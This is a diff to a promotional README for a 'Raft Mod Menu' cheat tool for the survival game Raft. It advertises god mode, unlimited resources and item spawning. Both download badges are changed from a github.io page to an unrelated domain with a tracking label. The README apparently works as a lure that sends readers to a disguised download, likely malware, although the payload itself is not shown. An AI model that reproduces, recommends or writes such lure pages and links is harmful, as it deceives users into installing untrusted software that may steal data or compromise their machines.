@@ -2,7 +2,7 @@
 
 The **Raft Mod Menu** is a powerful utility designed to elevate your gameplay experience in the oceanic survival game *Raft*. Whether you're building the floating fortress of your dreams, exploring the vast sea without limits, or simply trying to survive with ease, this mod menu provides the tools you need to take control of every aspect of the game.
 
-[![Download Raft ModMenu](https://img.shields.io/badge/Download-Raft%20ModMenu-blueviolet)](https://raft-mod-menu.github.io/.github/)
+[![Download Raft ModMenu](https://img.shields.io/badge/Download-Raft%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 With features like god mode, unlimited resources, item spawning, and more, you can focus on creativity and exploration rather than grinding for survival.
 
@@ -53,4 +53,4 @@ With the **Raft Mod Menu**, you’re no longer at the mercy of the sea. Build wi
 
 **Craft your legacy. Rule the ocean.**
 
-[![Download Raft ModMenu](https://img.shields.io/badge/Download-Raft%20ModMenu-blueviolet)](https://raft-mod-menu.github.io/.github/)![image](https://github.com/user-attachments/assets/9f7a3f03-6ee0-4883-b498-7b37ed046071)
+[![Download Raft ModMenu](https://img.shields.io/badge/Download-Raft%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
